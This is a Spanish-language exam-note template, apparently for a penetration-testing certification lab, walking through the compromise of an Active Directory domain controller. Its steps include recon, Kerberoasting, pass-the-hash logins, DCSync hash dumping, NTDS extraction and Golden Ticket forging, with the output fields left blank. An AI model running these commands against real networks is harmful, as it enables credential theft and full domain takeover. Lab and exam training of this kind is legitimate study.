# 👑 AD — Domain Controller — `<IP>`

> **Rol**: Domain Controller · **Estado**: ⬜ · 🟡 · ✅
> **Puntos**: **20** (el más valioso del set) → acceso ☐ (10) · DA/DCSync ☐ (10)

[[00-dashboard|Panel]] · [[ad-credenciales|Creds AD]] · [[AD-walkthrough|Walkthrough AD]] · [[LPE-Windows]] · [[05-active-directory|AD (guía)]]

---

## 0. Datos rápidos

| Dato | Valor |
| --- | --- |
| IP | |
| Hostname | |
| Dominio | |
| SO | Windows Server (DC) |
| Vector de entrada | |
| ¿Llegué a DA? | |

## 🔑 Credenciales / hashes de ESTA máquina

| Usuario | Contraseña | Hash | Notas |
| --- | --- | --- | --- |
| | | | |

> Copiá también a [[ad-credenciales]].

---

## 1. Recon

```bash
export IP=''; export DOMAIN=''; export DC_IP="$IP"
sudo nmap -p- --min-rate 5000 -T4 -oA ~/examen/nmap/$IP-alltcp $IP
ports=$(grep -oP '^\d+' ~/examen/nmap/$IP-alltcp.nmap | sort -u | paste -sd,)
sudo nmap -sCV -p$ports -oA ~/examen/nmap/$IP-services $IP
```
```text
▶ OUTPUT
```
Puertos típicos de DC: **88, 135, 139, 389/636, 445, 464, 593, 3268/3269, 5985**.
📸 Captura: `______`

---

## 2. Enumeración del dominio

```bash
nxc smb  $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --users --groups --loggedon-users
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN" --pass-pol --get-sid
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN" --kerberoasting kerb.txt --asreproast asrep.txt
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" -c all --zip
```
```text
▶ OUTPUT
```
📸 Captura: `______`

> **SID del dominio** (para Golden): `nxc ldap $DC_IP ... --get-sid`

---

## 3. Foothold

```bash
evil-winrm -i $IP -u "$USER" -p "$PASS"
evil-winrm -i $IP -u "$USER" -H "$NTHASH"
# o PtT:
export KRB5CCNAME=ticket.ccache && wmiexec.py -k -no-pass "$DOMAIN/$USER@$IP"
```
```text
▶ OUTPUT
```
📸 Captura del acceso: `______`

---

## 4. `local.txt`

```cmd
type C:\Users\<user>\Desktop\local.txt & ipconfig
```
```text
▶ OUTPUT
```
📸 **Captura (contenido + IP):** `______` ✅

---

## 5. LPE Windows (si el acceso no es admin/SYSTEM) → [[LPE-Windows]]

```cmd
whoami /all & whoami /priv
potato_check64.exe
```
```text
▶ OUTPUT
```
📸 Captura de admin/SYSTEM: `______`

---

## 6. Compromiso del dominio (DA)

### DCSync
```bash
secretsdump.py -just-dc "$DOMAIN/$USER:$PASS@$DC_IP"
secretsdump.py -hashes :"$NTHASH" "$DOMAIN/$USER@$DC_IP" -just-dc-ntlm
```
```text
▶ OUTPUT  (guardar hashes de Administrator y krbtgt)
```

### Alternativa: NTDS
```bash
nxc smb $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN" --ntds
```

### Golden Ticket (si tenés el hash del krbtgt)
```bash
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN" --get-sid
secretsdump.py -just-dc-user krbtgt "$DOMAIN/$USER:$PASS@$DC_IP"
ticketer.py -nthash <KRBTGT_NTHASH> -domain-sid <SID> -domain "$DOMAIN" Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass "$DC_HOST"
```
```text
▶ OUTPUT
```

> ⚠️ **NUNCA cambies la contraseña del `krbtgt`** (dos cambios rompen el dominio).

---

## 7. `proof.txt`

```cmd
type C:\Users\Administrator\Desktop\proof.txt & ipconfig
```
```text
▶ OUTPUT
```
📸 **Captura (contenido + IP):** `______` ✅

---

## 8. Loot y notas

**Hashes de dominio / krbtgt:**
```

```

**Pendientes / próximos pasos:**
```

```
